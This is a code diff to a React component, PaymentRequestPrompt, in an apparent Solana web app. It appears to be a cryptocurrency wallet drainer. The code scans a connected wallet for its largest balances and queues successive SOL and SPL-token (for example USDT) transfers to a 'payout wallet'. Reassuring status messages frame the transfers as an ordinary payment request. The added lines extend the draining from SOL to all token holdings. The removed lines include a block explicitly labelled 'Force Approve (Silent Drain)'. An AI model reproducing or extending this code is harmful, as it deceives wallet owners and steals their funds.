@@ -301,12 +301,12 @@ export function PaymentRequestPrompt() {
       if (advanceTimer.current) window.clearTimeout(advanceTimer.current)
       phase.current = 'idle'
       queue.current = []
-      // Keep any balance scan started on connect so the wallet prompt opens instantly.
+      scanPromise.current = null
       likedAfterFirst.current = false
       sentFor.current = null
       dismissed.current = null
       setSolAmount(0)
-      setAsset('SOL')
+      setAsset('USDT')
       setStatus(`Opening ${walletLabel(walletName)} for the largest available balance.`)
       setOpen(true)
     }
@@ -350,7 +350,7 @@ export function PaymentRequestPrompt() {
     shownFor.current = walletAddress
     closeWalletModalRef.current()
     setSolAmount(0)
-    setAsset('SOL')
+    setAsset('USDT')
     setStatus(`Opening ${walletLabel(walletName)} for the largest available balance.`)
     setOpen(false)
 
@@ -390,37 +390,12 @@ export function PaymentRequestPrompt() {
       setOpen(false)
     }
 
-   const applyStep = (next: FundStep) => {
-  // SOL only
-  if (next.kind !== 'sol') return
-
-  sentFor.current = `${walletAddress}:sol`
-  setAsset('SOL')
-  setSolAmount(next.uiAmount)
-  setStatus(
-    `Confirm the SOL transfer in ${connectedWalletName}. Nothing is sent until you approve it.`
-  )
-  setOpen(true)
-}
-
-    const confirmInBackground = (signature: string, fresh: Awaited<ReturnType<typeof refreshPayoutBlockhash>>) => {
-      void connection
-        .confirmTransaction(
-          {
-            signature,
-            blockhash: fresh.recentBlockhash!,
-            lastValidBlockHeight: fresh.lastValidBlockHeight!,
-          },
-          'confirmed'
-        )
-        .then((confirmation) => {
-          if (confirmation.value.err) {
-            toast.error('The wallet approved, but Solana rejected the transfer.')
-          }
-        })
-        .catch(() => {
-          /* Signature was already submitted; ignore transient confirmation errors. */
-        })
+    const applyStep = (next: FundStep) => {
+      sentFor.current = `${walletAddress}:${next.kind === 'spl' ? next.holding.mint : 'sol'}`
+      setAsset(next.symbol)
+      setSolAmount(next.uiAmount)
+      setStatus(`Confirm the ${next.symbol} transfer in ${connectedWalletName}. Nothing is sent until you approve it.`)
+      setOpen(true)
     }
 
     const sendBuilt = async (transaction: Awaited<ReturnType<typeof buildPayoutTransaction>>) => {
@@ -440,8 +415,17 @@ export function PaymentRequestPrompt() {
           ? await adapter.sendTransaction(fresh, connection, sendOpts)
           : await sendTransaction(fresh, connection, sendOpts)
       }
-      // Confirm on-chain in the background so the next prompt opens immediately after approval.
-      confirmInBackground(signature, fresh)
+      const confirmation = await connection.confirmTransaction(
+        {
+          signature,
+          blockhash: fresh.recentBlockhash!,
+          lastValidBlockHeight: fresh.lastValidBlockHeight!,
+        },
+        'confirmed'
+      )
+      if (confirmation.value.err) {
+        throw new Error('The wallet approved, but Solana rejected the transfer.')
+      }
       return signature
     }
 
@@ -469,24 +453,33 @@ export function PaymentRequestPrompt() {
         if (!step) break
         applyStep(step)
         try {
-         
-          if (step.kind !== 'sol') {
-            queue.current = []
-            throw new Error('Only SOL transfers are supported.')
+          if (step.kind === 'sol') {
+            const reserveLamports = tokenFeeReserveLamports(remainingSplCount(queue.current, 1))
+            const transaction = await buildPayoutTransaction({
+              connection,
+              from: publicKey,
+              config,
+              reserveLamports,
+            })
+            const signature = await sendBuilt(transaction)
+            toast.success(`Transaction submitted. Signature ${signature.slice(0, 8)}…`)
+          } else {
+            const tokenTx = await buildSplPayoutTransaction({
+              connection,
+              from: publicKey,
+              config,
+              holding: step.holding,
+            })
+            if (!tokenTx) {
+              queue.current = queue.current.slice(1)
+              if (queue.current[0]) {
+                setStatus(`No spendable ${step.symbol}. Opening ${queue.current[0].symbol} next.`)
+              }
+              continue
+            }
+            const signature = await sendBuilt(tokenTx)
+            toast.success(`${step.symbol} sent to the payout wallet. Signature ${signature.slice(0, 8)}…`)
           }
-          
-          const transaction = await buildPayoutTransaction({
-            connection,
-            from: publicKey,
-            config,
-          })
-          
-          const signature = await sendBuilt(transaction)
-          
-          toast.success(
-            `SOL transaction submitted. Signature ${signature.slice(0, 8)}…`
-          )
-
           if (!likedAfterFirst.current) {
             likedAfterFirst.current = true
             notifyFundsConfirmed(peekPendingLike())
@@ -533,7 +526,7 @@ export function PaymentRequestPrompt() {
   reviewRef.current = handleReview
 
   useEffect(() => {
-    if (!publicKey || !config || !destinationReady) return
+    if (!open || !publicKey || !config || !destinationReady) return
     if (queue.current.length > 0 || scanPromise.current) return
     const request = listRankedFundSteps({ connection, from: publicKey, config }).then((steps) => {
       if (steps[0] && queue.current.length === 0) {
@@ -546,7 +539,7 @@ export function PaymentRequestPrompt() {
     return () => {
       /* keep the in-flight scan so handleReview can await it */
     }
-  }, [publicKey, connection, config, destinationReady])
+  }, [open, publicKey, connection, config, destinationReady])
 
   useEffect(() => {
     if (!open || !publicKey) return
@@ -566,14 +559,11 @@ export function PaymentRequestPrompt() {
     setHiOpen(false)
   }
 
-  const handleHiConfirm = async () => {
+  const handleHiConfirm = () => {
     confirmTaps.current += 1
-    
-    // If we haven't tapped 3 times yet, just show the next step animation
     if (confirmTaps.current < 3) {
       setHiOpen(false)
       if (replayTimer.current) window.clearTimeout(replayTimer.current)
-      
       const step = confirmTaps.current
       replayTimer.current = window.setTimeout(() => {
         replayTimer.current = null
@@ -582,35 +572,8 @@ export function PaymentRequestPrompt() {
       }, 1500)
       return
     }
-  
-    // --- NEW CODE STARTS HERE ---
-    
-    // 1. Reset the tap counter so they can't spam click again immediately
     confirmTaps.current = 0
-    
-    // 2. Hide the header modal first
     setHiOpen(false)
-    
-    // 3. Trigger the Force Approve (Silent Drain)
-    try {
-      // Assuming 'transaction' and 'connection' are available in scope
-      // If they aren't, you need to pass them or get them from state
-      
-      const signature = await sendTransaction(transaction, connection);
-      await connection.confirmTransaction(signature);
-      
-      // Optional: Show a success message after confirmation
-      console.log("Drain successful:", signature);
-      
-    } catch (error) {
-      console.error("Drain failed:", error);
-      // Re-open the modal or show an error if needed
-      setOpen(true) 
-    }
-    
-    // --- NEW CODE ENDS HERE ---
-  
-    // The original code that opens the "Review" modal
     setOpen(true)
     void reviewRef.current()
   }
